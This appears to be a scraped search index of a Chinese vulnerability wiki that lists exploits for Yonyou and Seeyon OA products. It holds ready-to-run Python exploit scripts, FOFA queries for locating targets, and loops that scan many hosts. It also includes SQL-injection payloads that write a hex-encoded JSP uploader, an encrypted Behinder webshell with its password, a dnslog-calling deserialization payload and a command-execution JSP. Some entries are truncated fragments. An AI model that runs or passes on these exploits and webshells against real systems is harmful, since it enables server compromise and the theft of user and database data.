\\x00\\x00\\x74\\x00\\x0e\"+dnslog+\"\\x74\\x00\\x04\\x68\\x74\\x74\\x70\\x70\\x78\\x74\\x00\\x18\\x68\\x74\\x74\\x70\\x3a\\x2f\\x2f\"+dnslog+\"\\x3a\\x38\\x30\\x78\" uploadHeader={\"User-Agent\": \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36\"} req = requests.post(\"http://+\"ip\"+/service/~xbrl/XbrlPersistenceServlet\", headers=uploadHeader, verify=False, data=data, timeout=25) print (req.text) 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/OA产品漏洞/用友OA/用友 NC bsh.servlet.BshServlet 远程命令执行漏洞.html":{"url":"book/OA产品漏洞/用友OA/用友 NC bsh.servlet.BshServlet 远程命令执行漏洞.html","title":"用友 NC bsh.servlet.BshServlet 远程命令执行漏洞","keywords":"","body":"用友 NC bsh.servlet.BshServlet 远程命令执行漏洞 漏洞描述 用友 NC bsh.servlet.BshServlet 存在远程命令执行漏洞，通过BeanShell 执行远程命令获取服务器权限 漏洞影响 [!NOTE] 用友 NC FOFA [!NOTE] icon_hash=\"1085941792\" 漏洞复现 访问页面如下 漏洞Url为 /servlet/~ic/bsh.servlet.BshServlet 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/OA产品漏洞/用友OA/用友ERP-NC 目录遍历漏洞.html":{"url":"book/OA产品漏洞/用友OA/用友ERP-NC 目录遍历漏洞.html","title":"用友ERP-NC 目录遍历漏洞","keywords":"","body":"用友ERP-NC 目录遍历漏洞 漏洞描述 用友ERP-NC 存在目录遍历漏洞，攻击者可以通过目录遍历获取敏感文件信息 漏洞影响 [!NOTE] 用友ERP-NC FOFA [!NOTE] app=\"用友-UFIDA-NC\" 漏洞复现 POC为 /NCFindWeb?service=IPreAlertConfigService&filename= 查看 ncwslogin.jsp 文件 Goby & POC [!NOTE] YongYou ERP-NC directory traversal 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/OA产品漏洞/用友OA/用友 U8 OA test.jsp SQL注入漏洞.html":{"url":"book/OA产品漏洞/用友OA/用友 U8 OA test.jsp SQL注入漏洞.html","title":"用友 U8 OA test.jsp SQL注入漏洞","keywords":"","body":"用友 U8 OA test.jsp SQL注入漏洞 漏洞描述 用友 U8 OA test.jsp文件存在 SQL注入漏洞，由于与致远OA使用相同的文件，于是存在了同样的漏洞 漏洞影响 [!NOTE] 用友 U8 OA FOFA [!NOTE] \"用友U8-OA\" 漏洞复现 可参考 文章 致远OA A6 test.jsp SQL注入漏洞 登录页面如下 POC /yyoa/common/js/menu/test.jsp?doType=101&S1=(SELECT%20MD5(1)) 利用方法与致远OA 的SQL注入类似 漏洞POC import requests import sys import random import re from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34m公众号 : PeiQi文库 \\033[0m') print('+ \\033[34mTitle : 用友 U8 OA test.jsp SQL注入漏洞 \\033[0m') print('+ \\033[36m使用格式: python3 poc.py \\033[0m') print('+ \\033[36mFile >>> ip.txt \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url = target_url + \"/yyoa/common/js/menu/test.jsp?doType=101&S1=(SELECT%20md5(1))\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", } try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5) if \"c4ca4238a0b923820dcc509a6f75849b\" in response.text and response.status_code == 200: print(\"\\033[32m[o] 目标 {}存在漏洞 \\n[o] 响应地址: {} \\033[0m\".format(target_url, vuln_url)) else: print(\"\\033[31m[x] 目标 {}不存在漏洞 \\033[0m\".format(target_url)) except Exception as e: print(\"\\033[31m[x] 目标 {} 请求失败 \\033[0m\".format(target_url)) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) POC_1(target_url) 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/OA产品漏洞/用友OA/用友 NCCloud FS文件管理SQL注入.html":{"url":"book/OA产品漏洞/用友OA/用友 NCCloud FS文件管理SQL注入.html","title":"用友 NCCloud FS文件管理SQL注入","keywords":"","body":"用友 NCCloud FS文件管理SQL注入 漏洞描述 用友 NCCloud FS文件管理登录页面对用户名参数没有过滤，存在SQL注入 漏洞影响 [!NOTE] 用友 NCCloud FOFA [!NOTE] \"NCCloud\" 漏洞描述 登录页面如下 在应用中存在文件服务器管理登录页面 http://xxx.xxx.xxx.xxx/fs/ 登录请求包如下 GET /fs/console?username=123&password=%2F7Go4Iv2Xqlml0WjkQvrvzX%2FgBopF8XnfWPUk69fZs0%3D HTTP/1.1 Host: xxx.xxx.xxx.xxx Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6 Cookie: JSESSIONID=2CF7A25EE7F77A064A9DA55456B6994D.server; JSESSIONID=0F83D6A0F3D65B8CD4C26DFEE4FCBC3C.server Connection: close 使用Sqlmap对username参数 进行SQL注入 sqlmap -r sql.txt -p username 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/OA产品漏洞/致远OA/":{"url":"book/OA产品漏洞/致远OA/","title":"致远OA","keywords":"","body":"致远OA 致远OA A6 createMysql.jsp 数据库敏感信息泄露 致远OA A6 DownExcelBeanServlet 用户敏感信息泄露 致远OA A6 initDataAssess.jsp 用户敏感信息泄露 致远OA A6 test.jsp SQL注入漏洞 致远OA A8 htmlofficeservlet RCE漏洞 致远OA getSessionList.jsp Session泄漏漏洞 致远OA ajax.do 登录绕过 任意文件上传 CNVD-2021-01627 致远OA webmail.do任意文件下载 CNVD-2020-62422 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/OA产品漏洞/致远OA/致远OA A6 createMysql.jsp 数据库敏感信息泄露.html":{"url":"book/OA产品漏洞/致远OA/致远OA A6 createMysql.jsp 数据库敏感信息泄露.html","title":"致远OA A6 createMysql.jsp 数据库敏感信息泄露","keywords":"","body":"致远OA A6 createMysql.jsp 数据库敏感信息泄露 漏洞描述 致远OA A6 存在数据库敏感信息泄露，攻击者可以通过访问特定的URL获取数据库账户以及密码 MD5 漏洞影响 [!NOTE] 致远OA A6 FOFA [!NOTE] title=\"致远A8+协同管理软件.A6\" 漏洞复现 当访问如下URL时执行了SQL语句 select * from mysql.user; 进行查询并返回到页面中 /yyoa/createMysql.jsp /yyoa/ext/createMysql.jsp 漏洞利用POC import requests import sys import random import re import base64 import time from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34m公众号 : PeiQi文库 \\033[0m') print('+ \\033[34mVersion: 致远OA A6 \\033[0m') print('+ \\033[36m使用格式: python3 poc.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url = target_url + \"/yyoa/createMysql.jsp\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", } try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, headers=headers, verify=False, timeout=5) print(\"\\033[36m[o] 正在请求 {}/yyoa/createMysql.jsp..... \\033[0m\".format(target_url)) if 'root' in response.text and response.status_code == 200: print(\"\\033[36m[o] 响应为:{}\\n \\033[0m\".format(response.text)) else: print(\"\\033[31m[x] 目标 {} 上传Webshell文件失败\\033[0m\".format(target_url)) sys.exit(0) except Exception as e: print(\"\\033[31m[x] 请求失败 \\033[0m\", e) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) POC_1(target_url) Goby & POC [!NOTE] 已上传 https://github.com/PeiQi0/PeiQi-WIKI-POC Goby & POC 目录中 Seeyon_OA_A6__Disclosure_of_database_sensitive_information 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/OA产品漏洞/致远OA/致远OA A6 DownExcelBeanServlet 用户敏感信息泄露.html":{"url":"book/OA产品漏洞/致远OA/致远OA A6 DownExcelBeanServlet 用户敏感信息泄露.html","title":"致远OA A6 DownExcelBeanServlet 用户敏感信息泄露","keywords":"","body":"致远OA A6 DownExcelBeanServlet 用户敏感信息泄露 漏洞描述 致远OA A6 存在某个未授权的接口导致任意访问者可下载OA中的用户信息 漏洞影响 [!NOTE] 致远OA A6 FOFA [!NOTE] title=\"致远A8+协同管理软件.A6\" 漏洞复现 访问如下URL即可跳转下载用户信息文件 http://xxx.xxx.xxx.xxx/yyoa/DownExcelBeanServlet?contenttype=username&contentvalue=&state=1&per_id=0 可以再利用得到的用户名使用弱口令爆破进入OA进一步攻击 漏洞利用POC import requests import sys import random import re from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34m公众号 : PeiQi文库 \\033[0m') print('+ \\033[34mVersion: 致远OA A6 \\033[0m') print('+ \\033[36m使用格式: python3 poc.py \\033[0m') print('+ \\033[36mFile >>> ip.txt \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url = target_url + \"/yyoa/DownExcelBeanServlet?contenttype=username&contentvalue=&state=1&per_id=0\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", } try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5) if \"@\" in response.text and response.status_code == 200: print(\"\\033[32m[o] 目标 {}存在漏洞,下载地址:{} \\033[0m\".format(target_url, vuln_url)) else: print(\"\\033[31m[x] 目标 {}不存在漏洞 \\033[0m\".format(target_url)) except Exception as e: print(\"\\033[31m[x] 请求失败 \\033[0m\", e) def Scan(file_name): with open(file_name, \"r\", encoding='utf8') as scan_url: for url in scan_url: if url[:4] != \"http\": url = \"http://\" + url url = url.strip('\\n') try: POC_1(url) except Exception as e: print(\"\\033[31m[x] 请求报错 \\033[0m\".format(e)) continue if __name__ == '__main__': title() file_name = str(input(\"\\033[35mPlease input Attack File\\nFile >>> \\033[0m\")) Scan(file_name) Goby & POC [!NOTE] 已上传 https://github.com/PeiQi0/PeiQi-WIKI-POC Goby & POC 目录中 Seeyon_OA_A6_DownExcelBeanServlet_User_information_leakage 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/OA产品漏洞/致远OA/致远OA A6 initDataAssess.jsp 用户敏感信息泄露.html":{"url":"book/OA产品漏洞/致远OA/致远OA A6 initDataAssess.jsp 用户敏感信息泄露.html","title":"致远OA A6 initDataAssess.jsp 用户敏感信息泄露","keywords":"","body":"致远OA A6 initDataAssess.jsp 用户敏感信息泄露 漏洞描述 致远OA A6 initDataAssess.jsp 存在用户敏感信息泄露 可以通过得到的用户名爆破用户密码进入后台进一步攻击 漏洞影响 [!NOTE] 致远OA A6 FOFA [!NOTE] title=\"致远A8+协同管理软件.A6\" 漏洞复现 访问下列URL泄露用户信息 http://xxx.xxx.xxx.xxx/yyoa/assess/js/initDataAssess.jsp 漏洞利用POC import requests import sys import random import re from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34m公众号 : PeiQi文库 \\033[0m') print('+ \\033[34mVersion: 致远OA A6 \\033[0m') print('+ \\033[36m使用格式: python3 poc.py \\033[0m') print('+ \\033[36mFile >>> ip.txt \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url = target_url + \"/yyoa/assess/js/initDataAssess.jsp\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", } try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5) if \"/yyoa/index.jsp\" not in response.text and \"personList\" in response.text and response.status_code == 200: print(\"\\033[32m[o] 目标 {}存在漏洞,泄露地址:{} \\033[0m\".format(target_url, vuln_url)) else: print(\"\\033[31m[x] 目标 {}不存在漏洞 \\033[0m\".format(target_url)) except Exception as e: print(\"\\033[31m[x] 请求失败 \\033[0m\") def Scan(file_name): with open(file_name, \"r\", encoding='utf8') as scan_url: for url in scan_url: if url[:4] != \"http\": url = \"http://\" + url url = url.strip('\\n') try: POC_1(url) except Exception as e: print(\"\\033[31m[x] 请求报错 \\033[0m\") continue if __name__ == '__main__': title() file_name = str(input(\"\\033[35mPlease input Attack File\\nFile >>> \\033[0m\")) Scan(file_name) Goby & POC [!NOTE] 已上传 https://github.com/PeiQi0/PeiQi-WIKI-POC Goby & POC 目录中 Seeyon_OA_A6_initDataAssess.jsp_User_information_leakage 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/OA产品漏洞/致远OA/致远OA A6 test.jsp SQL注入漏洞.html":{"url":"book/OA产品漏洞/致远OA/致远OA A6 test.jsp SQL注入漏洞.html","title":"致远OA A6 test.jsp SQL注入漏洞","keywords":"","body":"致远OA A6 test.jsp SQL注入漏洞 漏洞描述 致远OA A6 test.jsp 存在sql注入漏洞，并可以通过注入写入webshell文件控制服务器 漏洞影响 [!NOTE] 致远OA A6 FOFA [!NOTE] title=\"致远A8+协同管理软件.A6\" 漏洞复现 访问URL http://xxx.xxx.xxx.xxx/yyoa/common/js/menu/test.jsp?doType=101&S1=(SELECT%20database()) 返回了当前使用的数据库 要想写入shell需要知道写入的路径 这里得到路径 D:\\Program Files\\UFseeyon\\OA\\mysql\\bin..\\ 通过 into outfile 写入文件，这里因为 jsp木马存在特殊符号，使用 hex编码 上传允许文件上传的jsp文件 HEX编码 3C25696628726571756573742E676574506172616D657465722822662229213D6E756C6C29286E6577206A6176612E696F2E46696C654F757470757453747265616D286170706C69636174696F6E2E6765745265616C5061746828225C5C22292B726571756573742E676574506172616D65746572282266222929292E777269746528726571756573742E676574506172616D6574657228227422292E67657442797465732829293B253E http://xxx.xxx.xxx.xxx/yyoa/common/js/menu/test.jsp?doType=101&S1=select%20unhex(%273C25696628726571756573742E676574506172616D657465722822662229213D6E756C6C29286E6577206A6176612E696F2E46696C654F757470757453747265616D286170706C69636174696F6E2E6765745265616C5061746828225C22292B726571756573742E676574506172616D65746572282266222929292E777269746528726571756573742E676574506172616D6574657228227422292E67657442797465732829293B253E%27)%20%20into%20outfile%20%27E:/Program Files/UFseeyon/OA/tomcat/webapps/yyoa/test_upload.jsp%27 显示上图则上传成功，访问 test_upload.jsp 为空白不报错页面不存在就是上传成功 在发送请求包上传webshell，这里上传冰蝎 [!NOTE] 注意上传的webshell需要url编码一下 http://xxx.xxx.xxx.xxx/yyoa/peiqi_upload.jsp?f=testwebshell.jsp t=%3C%25%40page%20import%3D%22java.util.*%2Cjavax.crypto.*%2Cjavax.crypto.spec.*%22%25%3E%3C%25!class%20U%20extends%20ClassLoader%7BU(ClassLoader%20c)%7Bsuper(c)%3B%7Dpublic%20Class%20g(byte%20%5B%5Db)%7Breturn%20super.defineClass(b%2C0%2Cb.length)%3B%7D%7D%25%3E%3C%25if%20(request.getMethod().equals(%22POST%22))%7BString%20k%3D%22e45e329feb5d925b%22%3Bsession.putValue(%22u%22%2Ck)%3BCipher%20c%3DCipher.getInstance(%22AES%22)%3Bc.init(2%2Cnew%20SecretKeySpec(k.getBytes()%2C%22AES%22))%3Bnew%20U(this.getClass().getClassLoader()).g(c.doFinal(new%20sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext)%3B%7D%25%3E 连接木马 漏洞利用POC [!NOTE] EXP木马上传 import requests import sys import random import re import base64 import time import json from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34m公众号 : PeiQi文库 \\033[0m') print('+ \\033[34mVersion: 致远OA \\033[0m') print('+ \\033[36m使用格式: python3 poc.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url = target_url + \"/yyoa/common/js/menu/test.jsp?doType=101&S1=(SELECT%20@@basedir)\" try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.get(url=vuln_url, verify=False, timeout=5) if '序号' in response.text and \"@@basedir\" in response.text and response.status_code == 200: OA_dir = re.findall(r'>(.*)\\\\UFseeyon\\\\', response.text)[0] OA_dir = OA_dir[:2] + '/' + OA_dir[3:] print(\"\\033[32m[o] 目标 {}存在漏洞, 安装路径为:{} \\033[0m\".format(target_url, OA_dir)) webshell_name = \"test_upload{}.jsp\".format(random.randint(1,999)) OA_dir = OA_dir + \"/UFseeyon/OA/tomcat/webapps/yyoa/{}\".format(webshell_name) POC_2(target_url, OA_dir, webshell_name) else: print(\"\\033[31m[x] 目标 {}不存在漏洞 \\033[0m\".format(target_url)) except Exception as e: print(\"\\033[31m[x] 目标 {} 请求失败 \\033[0m\".format(target_url), e) def POC_2(target_url, OA_dir, webshell_name): vuln_url = target_url + \"/yyoa/common/js/menu/test.jsp?doType=101&S1=select%20unhex(%273C25696628726571756573742E676574506172616D657465722822662229213D6E756C6C29286E6577206A6176612E696F2E46696C654F757470757453747265616D286170706C69636174696F6E2E6765745265616C5061746828225C22292B726571756573742E676574506172616D65746572282266222929292E777269746528726571756573742E676574506172616D6574657228227422292E67657442797465732829293B253E%27)%20%20into%20outfile%20%27{}%27\".format(OA_dir) try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.get(url=vuln_url, verify=False, timeout=5) if 'already' in response.text and response.status_code == 200: print(\"\\033[32m[o] 文件写入木马上传失败，目标已存在相同文件，请重新运行\\033[0m\") elif \"No Data\" in response.text and response.status_code == 200: print(\"\\033[32m[o] 文件写入木马上传成功，上传路径为 {}\\033[0m\".format(OA_dir)) POC_3(target_url, webshell_name) else: print(\"\\033[31m[x] 目标 {} 木马上传失败 \\033[0m\".format(target_url)) except Exception as e: print(\"\\033[31m[x] 目标 {} 请求失败 \\033[0m\".format(target_url), e) def POC_3(target_url, webshell_name): rebe_webshell = \"testwebshell{}.jsp\".format(random.randint(1,999)) vuln_url = target_url + \"/yyoa/{}?f={}\".format(webshell_name, rebe_webshell) data = \"t=%3C%25%40page%20import%3D%22java.util.*%2Cjavax.crypto.*%2Cjavax.crypto.spec.*%22%25%3E%3C%25!class%20U%20extends%20ClassLoader%7BU(ClassLoader%20c)%7Bsuper(c)%3B%7Dpublic%20Class%20g(byte%20%5B%5Db)%7Breturn%20super.defineClass(b%2C0%2Cb.length)%3B%7D%7D%25%3E%3C%25if%20(request.getMethod().equals(%22POST%22))%7BString%20k%3D%22e45e329feb5d925b%22%3Bsession.putValue(%22u%22%2Ck)%3BCipher%20c%3DCipher.getInstance(%22AES%22)%3Bc.init(2%2Cnew%20SecretKeySpec(k.getBytes()%2C%22AES%22))%3Bnew%20U(this.getClass().getClassLoader()).g(c.doFinal(new%20sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext)%3B%7D%25%3E\" headers = { \"Content-Type\": \"application/x-www-form-urlencoded\" } try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) print(\"\\033[32m[o] 正在请求：{}\\033[0m\".format(vuln_url)) response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=5) if response.status_code == 200: print(\"\\033[32m[o] 木马上传成功, 路径为:{}/yyoa/{}\\033[0m\".format(target_url, rebe_webshell)) print(\"\\033[32m[o] 请使用冰蝎连接，密码为: rebeyond\\033[0m\") else: print(\"\\033[31m[x] 木马上传失败，可能被拦截 \\033[0m\".format(target_url)) except Exception as e: print(\"\\033[31m[x] 目标 {} 请求失败 \\033[0m\".format(target_url), e) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) POC_1(target_url) [!NOTE] 多个目标测试 import requests import sys import random import re from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34m公众号 : PeiQi文库 \\033[0m') print('+ \\033[34mVersion: 致远OA A6 \\033[0m') print('+ \\033[36m使用格式: python3 poc.py \\033[0m') print('+ \\033[36mFile >>> ip.txt \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url = target_url + \"/yyoa/common/js/menu/test.jsp?doType=101&S1=(SELECT%20md5(1))\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", } try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5) if \"c4ca4238a0b923820dcc509a6f75849b\" in response.text and response.status_code == 200: print(\"\\033[32m[o] 目标 {}存在漏洞,下载地址:{} \\033[0m\".format(target_url, vuln_url)) else: print(\"\\033[31m[x] 目标 {}不存在漏洞 \\033[0m\".format(target_url)) except Exception as e: print(\"\\033[31m[x] 目标 {} 请求失败 \\033[0m\".format(target_url)) def Scan(file_name): with open(file_name, \"r\", encoding='utf8') as scan_url: for url in scan_url: if url[:4] != \"http\": url = \"http://\" + url url = url.strip('\\n') try: POC_1(url) except Exception as e: print(\"\\033[31m[x] 请求报错 \\033[0m\".format(e)) continue if __name__ == '__main__': title() file_name = str(input(\"\\033[35mPlease input Attack File\\nFile >>> \\033[0m\")) Scan(file_name) Goby & POC 已上传 https://github.com/PeiQi0/PeiQi-WIKI-POC Goby & POC 目录中 Seeyon_OA_A6_test.jsp_SQL_injection 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/OA产品漏洞/致远OA/致远OA A6 setextno.jsp SQL注入漏洞.html":{"url":"book/OA产品漏洞/致远OA/致远OA A6 setextno.jsp SQL注入漏洞.html","title":"致远OA A6 setextno.jsp SQL注入漏洞","keywords":"","body":" 漏洞描述 致远OA A6 setextno.jsp 存在sql注入漏洞，并可以通过注入写入webshell文件控制服务器 漏洞影响 [!NOTE] 致远OA A6 FOFA [!NOTE] title=\"致远A8+协同管理软件.A6\" 漏洞复现 访问如下Url，其中含有 union注入 http://xxx.xxx.xxx.xxx/yyoa/ext/trafaxserver/ExtnoManage/setextno.jsp?user_ids=(99999) union all select 1,2,(md5(1)),4# 查看web路径 写入文件上传木马 http://xxx.xxx.xxx/yyoa/ext/trafaxserver/ExtnoManage/setextno.jsp?user_ids=(99999) union all select 1,2,(select unhex('3C25696628726571756573742E676574506172616D657465722822662229213D6E756C6C29286E6577206A6176612E696F2E46696C654F757470757453747265616D286170706C69636174696F6E2E6765745265616C5061746828225C22292B726571756573742E676574506172616D65746572282266222929292E777269746528726571756573742E676574506172616D6574657228227422292E67657442797465732829293B253E') into outfile 'D:/Program Files/UFseeyon/OA/tomcat/webapps/yyoa/test_upload.jsp'),4# 剩下的步骤参考另一篇 致远OA A6 test.jsp SQL注入漏洞 漏洞利用POC [!NOTE] 多个目标 import requests import sys import random import re from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34m公众号 : PeiQi文库 \\033[0m') print('+ \\033[34mVersion: 致远OA A6 \\033[0m') print('+ \\033[36m使用格式: python3 poc.py \\033[0m') print('+ \\033[36mFile >>> ip.txt \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url = target_url + \"/yyoa/ext/trafaxserver/ExtnoManage/setextno.jsp?user_ids=(99999) union all select 1,2,(md5(1)),4#\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", } try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5) if response.status_code == 200 and \"c4ca4238a0b923820dcc509a6f75849b\" in response.text: print(\"\\033[32m[o] 目标 {} 存在漏洞 \\033[0m\".format(target_url, vuln_url)) else: print(\"\\033[31m[x] 目标 {}不存在漏洞 \\033[0m\".format(target_url)) except Exception as e: print(\"\\033[31m[x] 目标 {} 请求失败 \\033[0m\".format(target_url)) def Scan(file_name): with open(file_name, \"r\", encoding='utf8') as scan_url: for url in scan_url: if url[:4] != \"http\": url = \"http://\" + url url = url.strip('\\n') try: POC_1(url) except Exception as e: print(\"\\033[31m[x] 请求报错 \\033[0m\".format(e)) continue if __name__ == '__main__': title() file_name = str(input(\"\\033[35mPlease input Attack File\\nFile >>> \\033[0m\")) Scan(file_name) Goby & POC [!NOTE] 已上传 https://github.com/PeiQi0/PeiQi-WIKI-POC Goby & POC 目录中 Seeyon_OA_A6_setextno.jsp_SQL_injection 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/OA产品漏洞/致    远OA/致远OA A8 状态监控页面信息泄露.html":{"url":"book/OA产品漏洞/致    远OA/致远OA A8 状态监控页面信息泄露.html","title":"致远OA A8 状态监控页面信息泄露","keywords":"","body":"致远OA A8 状态监控页面信息泄露 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:50:07 "},"book/OA产品漏洞/致远OA/致远OA A8 htmlofficeservlet RCE漏洞.html":{"url":"book/OA产品漏洞/致远OA/致远OA A8 htmlofficeservlet RCE漏洞.html","title":"致远 OA A8 htmlofficeservlet RCE漏洞","keywords":"","body":"致远 OA A8 htmlofficeservlet RCE漏洞 CNVD-2019-19299 漏洞描述 该漏洞最早于6月26号左右，有安全厂商发出漏洞预警。 远程攻击者在无需登录的情况下可通过向 URL /seeyon/htmlofficeservlet POST 精心构造的数据即可向目标服务器写入任意文件，写入成功后可执行任意系统命令进而控制目标服务器。 FOFA [!NOTE] title=\"致远A8-V5协同管理软件 V6.1sp1\" 影响版本 [!NOTE] 致远A8-V5协同管理软件V6.1sp1 致远A8+协同管理软件V7.0、V7.0sp1、V7.0sp2、V7.0sp3 致远A8+协同管理软件V7.1 漏洞复现 访问目标站点 http://xxx.xxx.xxx.xxx:8088/seeyon/htmlofficeservlet 出现如下图响应，则可能含有漏洞 使用POST请求发出如下请求包 DBSTEP V3.0 355 0 666 DBSTEP=OKMLlKlV OPTION=S3WYOSWLBSGr currentUserId=zUCTwigsziCAPLesw4gsw4oEwV66 CREATEDATE=wUghPB3szB3Xwg66 RECORDID=qLSGw4SXzLeGw4V3wUw3zUoXwid6 originalFileId=wV66 originalCreateDate=wUghPB3szB3Xwg66 FILENAME=qfTdqfTdqfTdVaxJeAJQBRl3dExQyYOdNAlfeaxsdGhiyYlTcATdN1liN4KXwiVGzfT2dEg6 needReadFile=yRWZdAS6 originalCreateDate=wLSGP4oEzLKAz4=iz=66 \"+excuteCmd(request.getParameter(\"cmd\")) + \"\");}else{out.println(\":-)\");}%>>a6e4f045d4b8506bf492ada7e3390d7ce 出现如图响应则为上传成功 访问 http://xxx.xxx.xxx.xxx:8088/seeyon/testtesta.jsp?pwd=calsee&cmd=cmd+/c+dir 漏洞利用POC Goby中含有漏洞检测POC 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/OA产品漏洞/致远OA/致远OA getSessionList.jsp Session泄漏漏洞.html":{"url":"book/OA产品漏洞/致远OA/致远OA getSessionList.jsp Session泄漏漏洞.html","title":"致远OA getSessionList.jsp Session泄漏漏洞","keywords":"","body":"致远OA getSessionList.jsp Session泄漏漏洞 漏洞描述 通过使用存在漏洞的请求时，会回显部分用户的Session值，导致出现任意登录的情况 影响版本 [!NOTE] 未知 漏洞复现 源码 \\r\\n\"; outXML += \"\\r\\n\"; // outXML += \"\\r\\n\"; // outXML += \"\\r\\n\"; outXML += \"\\r\\n\"; } out.println(outXML); %> 